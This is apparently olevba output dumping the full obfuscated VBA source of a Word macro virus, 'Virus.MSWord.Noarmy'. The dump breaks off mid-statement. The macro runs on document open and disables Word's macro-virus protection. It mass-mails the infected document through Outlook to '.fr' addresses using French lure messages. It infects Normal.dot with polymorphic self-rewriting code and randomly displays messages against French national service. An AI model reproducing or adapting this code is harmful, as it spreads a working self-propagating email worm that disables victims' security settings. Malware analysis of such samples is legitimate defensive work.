olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Noarmy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: ./Virus.MSWord.Noarmy - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, d3, g6, h3, k1, k5, g3, n6, h5, j5, k7: Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, _
c4, f3, h1, d8 ' jhqqihma
Dim g5, e1, m4, b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' wzgl
Private Sub Document_Open(): On Error Resume Next ' pfuclghvxf
Call f1: Call f2 ' eetpsc
Randomize: Select Case System.PrivateProfileString(j1, k2, j8): Case Is <> j1 ' ghyidbw
System.PrivateProfileString(j1, k2, j8) = 1& ' nolxk
Case Else: Options.ConfirmConversions = m5: Options.VirusProtection = m5: Options.SaveNormalPrompt = m5: End Select ' davvpgpdtlfaf
d8 = a5 ' msgxlyud
Set c4 = CreateObject(d8) ' xmqxjsgfalofskn
Set f3 = c4.GetNameSpace(l8) ' nbyxwczqceotkiv
Select Case System.PrivateProfileString(j1, d3, g6) ' ztxoyoqarkpe
Case Is <> h3 ' kjyixkqhbyi
Select Case c4: Case k1: f3.Logon k5, g3 ' qcfnfb
For i = 1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i): Set h1 = c4.CreateItem(m5): h2 = g4.AddressEntries.Count: b6 = m5 ' bnaz
For j = 1 _
To h2: Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address) ' rkyt
Case Is _
> 4 ' ujqqzysg
Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, vbTextCompare): Case Is <> 0 ' pchlppmcnmgy
h1.Recipients.Add j2 ' smncyl
b6 = b6 + 1: End Select ' lasplbofh
End Select ' wkhfcjt
Select Case b6: Case 50: Exit For: End Select: Next j: Select Case Rnd() ' tpvucamfyjc
Case Is < 0.33: h1.Subject = h5 ' yaumpzklsd
h1.Body = j5: Case Is < 0.66 ' bttrryf
h1.Subject = g1: h1.Body = l3: Case Else ' qqsweex
h1.Subject = l9: h1.Body = n2: End Select ' keflhuyodrfmhmc
h1.Attachments.Add ActiveDocument.FullName ' gkzwkielk
h1.Send: Next i: f3.Logoff: End Select: System.PrivateProfileString(j1, d3, _
g6) = h3 ' lxglxcacbo
End Select: Set n1 = ActiveDocument.VBProject: Set i6 = _
n1.VBComponents.Item(1): Set n1 = NormalTemplate.VBProject: Set _
k3 = n1.VBComponents.Item(1): i2 = False ' myuycxcajww
Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case i6.Name: Case Is <> g6: Set b5 = k3 ' mhxawbxeijlpda
Set f5 = i6 ' mihpcj
i2 = True: End Select: End Select: Select Case k3.Name: Case Is <> g6 ' xyxtkkaa
Set b5 = i6: Set f5 = k3: i2 = True ' qvqkahjys
End Select: Select Case i2 ' evrd
Case True ' gyidk
i4 = b5.CodeModule.CountOfLines - 1 ' xtls
c8 = f5.CodeModule.CountOfLines: Select Case c8 ' brshcdshk
Case Is > 0 ' qzmeryqa
f5.CodeModule.DeleteLines 1, c8: End Select: c6 = 1 ' ipgn
c9 = "" ' fmhrchrmaozmo
j3 = "": a6 = 0 ' cyqoxc
For l2 _
= 1 To i4: h4 = b5.CodeModule.Lines(l2, 1) ' jfxypjhpkyvi
i = 1 ' eivduk
f4 = InStr(1, h4, Chr(39)) ' orziswkb
Select Case f4 ' chyleczoneldw
Case 0 ' dodbv
f4 = Len(h4): Case Else ' osbsfbrkttsee
f4 = f4 - 2: End Select ' scjcdnhw
Do: j = InStr(i, h4, Chr(32)) ' ujpdxversouw
Select Case j ' prlfxb
Case 0 ' xrisakg
j = Len(h4) + _
1: b8 = True: Case f4 + 1: b8 = True: Case Else ' jxsygrfdauvr
b8 = False ' fgwxfmsy
End Select: n5 = Mid(h4, i, j - i): Select Case b8 ' nqfzq
Case True: f6 = b5.CodeModule.Lines(l2 + 1, 1): k4 = InStr(1, f6, Chr(32)): Select Case k4 ' qenclaqgsdorw
Case 0: j3 _
= "" ' xcoicibsmrkryk
Case Else ' yqfzztijrotcz
j3 = Mid(f6, 1, k4 - 1) ' tnhz
End Select: End Select ' dnujjmhcttk
Select Case n5: Case k7 + Chr(58): n5 _
= e8 + Chr(58): Case e8 + Chr(58): n5 = k7 + Chr(58) ' yodlx
Case k7 ' fthgwcd
n5 = e8: Case e8: n5 = k7 ' tzrapjwlmlqjgsi
End Select ' sodclmwonyrvy
Select Case h6 ' ctmqdolrcnizo
Case False: Select Case Rnd() ' aqevmrwmrbfdx
Case Is < 0.02 ' caecjt
h6 = True ' duagmvum
Case Else ' jclbrissqrebsl
h6 = False ' idgczfi
Select Case b8 ' hgbecjnlh
Case True ' ifztwfesplsxamt
Select Case l2: Case i4 ' mjbpjmrg
h6 = True ' nfiih
End Select ' liwovm
Select Case Rnd() ' lviolyevlsq
Case Is < 0.5 ' twkle
h6 = True: End Select: Select Case j3 ' lutfpcpmlrxsqt
Case e4 ' csqg
h6 = True: a6 = a6 + 1: Select Case a6: Case 4: l2 = i4: End Select: End Select ' ahidtqc
Select Case InStr(1, h4, c7): Case Is <> 0: Select Case _
n5: Case j17 ' gihngyrstkmab
h6 = _
False: Case Else ' wgskquvd
h6 = True: End Select: End Select ' hkqz
End Select ' objkd
End Select ' xllzlv
Select Case Len(n5) ' wdaepf
Case Is _
<> 0: Select Case InStr(Len(n5), _
n5, Chr(58)) ' vwndqjy
Case Is <> 0 ' ljywvzwbvq
Select Case Rnd(): Case Is _
< 0.5 ' vyfjauowzmbyg
h6 _
= True: End Select ' sdfurmlnowjquv
End Select ' vnskzbkre
End Select ' hyxhqvtnvwufuzo
Case Else: h6 = False: End Select ' eswqddwbypc
Select Case b8: Case True: Select Case n5: Case Chr(95) ' nxmdw
c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1): j4 = False: Case Else: c9 = c9 + Switch(h6 = _
True, n5, h6 = False, n5 + Chr(58) + Chr(32)): j4 = True ' edvnvldagr
End Select ' uymuaa
Case Else: Select Case InStr(Len(n5), n5, Chr(58)) ' brdgeobbhwoodr
Case 0: c9 = c9 + Switch(h6 = True, n5 _
+ Chr(32) + Chr(95), h6 = False, n5 + Chr(32)): j4 = False ' gwhj
Case Else: c9 = c9 + Switch(h6 = True, Mid(n5, 1, Len(n5) - 1), h6 = False, n5 + Chr(32)): j4 = True ' owhdmndgkcrl
End Select: End Select: Select Case h6 ' cctsx
Case True: Select Case j4 ' nptwswtqjg
Case True ' dmlp
c9 = c9 + Chr(32) + Chr(39) + Chr(32): e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6: c9 = c9 + Chr$(Int((26 * Rnd) + 97)): Next d5 ' nanslupschi
End Select: f5.CodeModule.InsertLines c6, c9: c6 = c6 + 1: c9 = "" ' nrkcytmbuflphr
End Select ' xxxspio
i = j + 1 ' kjcf
Select Case b8 ' mqgbbigipro
Case True ' ynqjqceeeyr
Exit Do: End Select ' lqclz
Loop: Next l2 ' qzmhxmfqqh
Select Case k3.Name ' myubo
Case Is <> g6: f5.Name = g6: NormalTemplate.Save: End Select ' qnaekkfnwqr
Select Case i6.Name ' yjisbyfk
Case Is <> g6 ' hhktfc
f5.Name = g6 ' nkpbrexwm
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' cflnbkt
ActiveDocument.Saved = True: End Select: Case Else: Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case Rnd(): Case Is < 0.015 ' mxqwo
MsgBox h8 + l5 + i1 + i7, 32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16: MsgBox i3 + g2 _
+ e5 + d2 + a4, 16 ' huvdcupsw
MsgBox a3 + a2 + c2 + d1 + _
c3, 16 ' ngdeadlolookk
MsgBox c1 + b2, 16: MsgBox _
b1 + a1, 48 ' ejzjrtgnsrqemj
Case Is _
< 0.03: Selection.TypeText b9: Case Is < 0.045 ' vbvnewxwhdidito
Selection.TypeText a7 ' irozpnezl
Case Is < 0.06: Selection.TypeText d6 ' proghcjbh
Case Is < 0.075 ' pmadcdesodar
Selection.TypeText c5 ' qgjwd
Case Is < 0.09 ' vyvzsbusezdkcqi
Selection.TypeText e2 ' wrmmjnflxr
End Select: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' owyxsmbqi
ActiveDocument.Saved = True: End Select: End Select ' cnsmdqfwssper
End Sub ' drnnt
Private Sub f1(): h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) ' jeop
g8 = Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46): j1 = "": k2 = Chr(72) + Chr(75) + Chr(69) + _
Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + _
Chr(82) + Chr(69) + Chr(78): k2 = k2 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) _
+ Chr(83) + Chr(111) + Chr(102): k2 = k2 + Chr(116) + Chr(119) + Chr(97) + _
Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' kjiyrjlsmxf
k2 = k2 + _
Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + _
Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) _
+ Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + _
Chr(92) + Chr(87) + Chr(111) + Chr(114): k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121): j8 = Chr(76) + Chr(101) + Chr(118) _
+ Chr(101) + Chr(108) ' cieb
l1 = Chr(84) + Chr(111) _
+ Chr(111) + Chr(108) _
+ Chr(115) ' azdhawyveld
m5 = 0: l8 _
= Chr(77) + Chr(65) + Chr(80) + Chr(73) ' wifhvc
a5 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) ' ycqrmkcilxqsutu
a5 = a5 + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) _
+ _
Chr(105) + _
Chr(111) + Chr(110): d3 = Chr(72) _
+ Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78): d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) _
+ Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) ' znmce
d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' tmideqvudfthcit
d3 = d3 _
+ Chr(99) + Chr(101) + Chr(92): g6 = Chr(78) + Chr(79) + Chr(83) + Chr(78): h3 = "Non" + Chr(32) + "au" + Chr(32) + "Service" + _
Chr(32) + "National" + Chr(32) + "-" + Chr(32) + "Oui" + Chr(32): h3 = h3 + _
"au" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail": k1 = Chr(79) + Chr(117) _
+ Chr(116) + _
Chr(108) + Chr(111) + Chr(111) + Chr(107): k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101): g3 = _
Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100) ' xofgafojpgs
n6 = Chr(46) + Chr(102) + Chr(114) ' auujmijblwdaze
h5 = "Suggestion..." ' iticilkpadgri
j5 = "Ce" + Chr(32) + "document" + _
Chr(32) + "(" + ActiveDocument.Name + ")" + Chr(32) + "vaut" _
+ Chr(32) + "bien" ' hcahr
j5 = j5 + Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) _
+ "savoir" + Chr(32) + "s" _
+ Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" + Chr(32) ' kgisnaaetv
j5 = j5 + "qu" _
+ Chr(39) _
+ "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13): k7 = Chr(68) + Chr(111) + Chr(99) _
+ Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95): k7 = k7 _
+ Chr(67) + _
Chr(108) + Chr(111) + Chr(115) _
+ Chr(101) + Chr(40) + Chr(41) ' esklext
e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
Chr(110) + _
Chr(116): e8 = e8 + Chr(95) _
+ Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32) ' yiqvxylqcxdi
a7 = Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32) ' geeqr
d6 = Chr(32) + "http://www.donquichotte.com" + Chr(32): c5 = Chr(32) + "http://www.multimania.com/antisn" + Chr(32) ' ygjr
e2 = Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "armée" + Chr(32) ' prkcsisrqpvrtiy
e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + "au" + Chr(32) + _
"service": e2 = e2 + Chr(32) _
+ "national" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail," + Chr(32): e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) _
+ "absurdité." + Chr(32): g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide...": l3 = "Je" + Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + "un" + Chr(32) + "peu" ' muygzzqefmzeixq
l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + _
"à" + _
Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document" ' cbespxozxy
l3 = l3 + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Merci" + Chr(32) + "de" + Chr(32) + "m" + Chr(39) + "aider" + Chr(32) ' cdels
l3 = l3 + "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + _
Chr(39) + "améliorer..." + Chr(13) ' linuges
l9 = "Version" + Chr(32) + "finale": n2 = "Voici" + Chr(32) + "la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + _
Chr(32) + "quoi" + Chr(32) + "j" + Chr(39) _
+ "ai" + Chr(32) + "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers": n2 = n2 + Chr(32) + "temps" + Chr(32) + _
"(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32) ' nrauux
n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) + "la" + Chr(32) + "bienvenue" + Chr(32) + "!" + Chr(13): m1 = "Document" ' cpkynsenirc
h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) + "à" _
+ Chr(32) + "résoudre" + Chr(32) + "est" _
+ Chr(32): h8 = h8 + "le" + Chr(32) + "suivant:" + Chr(13) + Chr(13): End Sub ' ruoqot
Private Sub f2(): l5 = "Lors" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "intervention" + Chr(32) + "télévisée" + Chr(32) + _
"du" + Chr(32) _
+ "22" + Chr(32) ' jjfqfdmkkczxh
l5 _
= l5 + "février" + Chr(32) + "1996," + Chr(32) + "Jacques" + Chr(32) + _
"Chirac," + Chr(32) + "Président" + Chr(32) + "de" + Chr(32) + "la" ' renfgjivpiysg
l5 = l5 + Chr(32) + "République" + Chr(32) + "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + "a" + Chr(32) + "proclamé:" + Chr(32) ' xjmrpwnbwrhhc
i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) + "plus" _
+ Chr(32) + "besoin" + _
Chr(32) + "d" + Chr(39) + _
"appelés..." + Chr(32) + "(Le" + Chr(32) + "service" + Chr(32) ' cjkrubwojrgzsg
i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + Chr(32) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus": i1 = i1 + Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" _
+ Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été": i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + "tous..." + Chr(32) + "ou" + Chr(32) + "presque:" + Chr(32) ' hjheatujzvae
i7 = "Alors" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" + Chr(32) + "obligatoire" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "gens": i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + Chr(32) + "nés" + _
Chr(32) + "avant" + Chr(32) ' xcfwyxhhwyz
i7 = i7 + "1979" + Chr(32) + _
"peuvent" + Chr(32) + "encore" + Chr(32) + "perdre" + Chr(32) + _
"emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32): i7 = i7 + _
"de" + Chr(32) _
+ "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + "du" + Chr(32) + "Service" + Chr(32) + "National." ' vnxqexsnse
g5 = "En" + Chr(32) + "réalité," + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + Chr(32) + "bien" + Chr(32) + "pire" + Chr(32): g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) _
+ "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32) ' wbrt
g5 = g5 + "de" _
+ Chr(32) + _
"2" + Chr(32) + "ans" + Chr(32) + "aux" + Chr(32): e1 = "jeunes" + Chr(32) + "ayant" _
+ Chr(32) + "obtenu" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail," + Chr(32) + "l" + Chr(39) + "Armée" + Chr(32) + "a" + Chr(32): e1 = e1 + "l" + Chr(39) + "intention" + Chr(32) + _
"de" + Chr(32) + "les" + Chr(32) + "rappeler" + Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32): e1 = e1 + "leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" + _
Chr(32) + "sont" + Chr(32) + "bien" + Chr(32): e1 = e1 + "sûr" _
+ Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Vivre" _
+ Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "pendant" + Chr(32) + "10" _
+ Chr(32) + "mois" + Chr(32) + "ne" ' dkekramf
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" _
+ Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32) ' whhhftu
b3 = "impôts" + Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" + Chr(32) _
+ "à" + Chr(32) + "assumer" + Chr(32) + "dans" + Chr(32) + "un" ' tsrbvsdku
b3 = b3 + Chr(32) + "début" _
+ Chr(32) + "de" _
+ Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + Chr(13) + Chr(13) ' oucef
d4 = Chr(32) + Chr(32) + "-" + _
Chr(32) + "Ne" _
+ Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + Chr(32) + "activité" + Chr(32) + "professionnelle" _
+ Chr(32): d4 = d4 + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "implique" + Chr(32) + "également" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "d" + Chr(39) + "expérience" ' empgn
d4 = d4 + Chr(32) + "utile," + Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) + "une" + _
Chr(32) + "période" + Chr(32) ' ejpxrgyactdnmhz
f7 = "de" _
+ Chr(32) + "réadaptation," + Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" + Chr(32) + "professionnel" ' cprot
f7 = f7 + Chr(32) + "et" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + _
"inquantifiable" + Chr(32) + "colère" + Chr(32) + "des" + Chr(32) + "employeurs," + Chr(32) ' jfluhakyxlqborq
f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" + Chr(32) + "ou" + _
Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32): f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" _
+ Chr(32) + "de" + Chr(32) + "carrière.": i3 = Chr(32) + _
Chr(32) + "-" + _
Chr(32) + "Du" + Chr(32) + "fait" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "soit" + Chr(32) + "tout" + Chr(32) + "bonnement" + Chr(32) + "impossible": i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + _
"sur" + Chr(32): i3 = i3 + "cette" + Chr(32) + "période," + Chr(32) ' ravslkqoh
g2 = "l" + Chr(39) + "abandon" _
+ Chr(32) + "du" + Chr(32) + "logement" + _
Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) + "Qui" + Chr(32) + "prendra" _
+ Chr(32) + "alors" + Chr(32): g2 = g2 + "en" + Chr(32) + "charge" + Chr(32) + "les" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32) ' fbmgyhosru
g2 = g2 + "et" + Chr(32) + "de" + Chr(32) _
+ "recherche" + Chr(32) _
+ "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' lgayodszijtyiwu
e5 = Chr(32) + Chr(32) + "-" + Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32): e5 = e5 + "au" + Chr(32) + "plus" _
+ Chr(32) + "bas" + Chr(32) + "durant" + Chr(32) + "ces" + Chr(32) + "10" _
+ Chr(32) + "longs" + Chr(32) + "mois" + Chr(32) + "?" + Chr(32) ' jxsmnlcrfvwyy
e5 = e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) _
+ "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32): e5 = e5 + "bâtir" + Chr(32) + "s" + Chr(39) + "effondre" + Chr(32) + "pour" + Chr(32) + "laisser" + Chr(32) + _
"place": d2 = Chr(32) + "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" + Chr(32) + "a" + _
Chr(32) + "l" + Chr(39) _
+ "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du" ' ndsmm
d2 = d2 + Chr(32) + "Service" + Chr(32) + "National." + Chr(32) + "Est-il" + Chr(32) + "possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + _
"loin" + Chr(32) + "de": a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" + Chr(32) + "ses" + Chr(32) + "relations," + Chr(32) + "de" ' cilrtcfovrf
a4 = Chr(32) + "ses" + Chr(32) + "amis," + Chr(32) + "pendant" + Chr(32) + "10" + _
Chr(32) + "mois" + Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + "si": a4 = a4 + Chr(32) + _
"rien" + Chr(32) + "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + "?" ' zsjgsymu
a3 = "Certains" + Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) + "devoir" ' ucqfrpwljnrr
a3 = a3 + _
Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" _
+ Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32): a3 = a3 + "ses" + Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + Chr(32) + "frais" + Chr(32) + "de" + _
Chr(32) + "la" + Chr(32) + _
"sécurité" + Chr(32) + "sociale," + Chr(32) + "des" ' wourvarnitdjbw
a3 = a3 + _
Chr(32) + "allocations" + Chr(32) + "chômage,": a2 _
= Chr(32) + _
"des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) _
+ "sont" + Chr(32) + "bien" + Chr(32) + _
"sûr" + Chr(32) + "les" + Chr(32) + "personnes" + Chr(32) + "qui": a2 = a2 _
+ Chr(32) + "travaillent" + Chr(32) + "qui" + Chr(32) + "payent" + Chr(32) + "tout" + Chr(32) + "cela," + Chr(32) + "et" + _
Chr(32) + "les" + _
Chr(32) + "actuels" + Chr(32) + "sursitaires": a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) + "partie." + Chr(32) + "Ils" + Chr(32) + "sont" _
+ Chr(32) + "bien" + Chr(32) + "plus" _
+ Chr(32) + "utiles" + Chr(32): c2 = "à" + Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" + Chr(32) _
+ "tant" + Chr(32) + "que" + Chr(32) + "cotisants" + Chr(32) + "qu" + Chr(39) + "en" + Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32): c2 = c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' zeuqjepb
d1 = "Le" + Chr(32) + "service" + Chr(32) + "national" + Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" + Chr(32) + "son" ' umezepka
d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32): d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." + Chr(32) + "C" + Chr(39) + "est" + Chr(32) _
+ "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) _
+ "véritable" _
+ Chr(32) + "utopisme" ' ctoeveklzkik
d1 = d1 + Chr(32) + _
"et" + Chr(32) + "le" + Chr(32) ' synfibocxxl
c3 = "bilan" + Chr(32) + "ne" + _
Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + "à" + Chr(32) + _
"une" + Chr(32) + "perte" + Chr(32) + "de" + Chr(32) + "10" + Chr(32) + "mois" _
+ Chr(32) ' zwdnyhzu
c3 = c3 + "de" + Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" + _
Chr(32) + "une" + Chr(32) + "véritable" + Chr(32) + "catastrophe" _
+ Chr(32) _
+ "pour" _
+ Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "financière," ' ricnjcobhwwm
c3 = _
c3 + Chr(32) + "matérielle" + Chr(32) + "et" + _
Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) + "des" + Chr(32) + _
"répercutions" + Chr(32) ' iqaz
c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables." ' qngahgxnldrnd
c1 = "Ils" + Chr(32) + "sont" + Chr(32) + _
"environ" + _
Chr(32) + "250" + Chr(32) + "000" + Chr(32) + _
"jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + _
Chr(32) + "à" + Chr(32) + "devoir" + Chr(32) ' jdxtobabsnf
c1 = c1 + "effectuer" + Chr(32) + "notre" + _
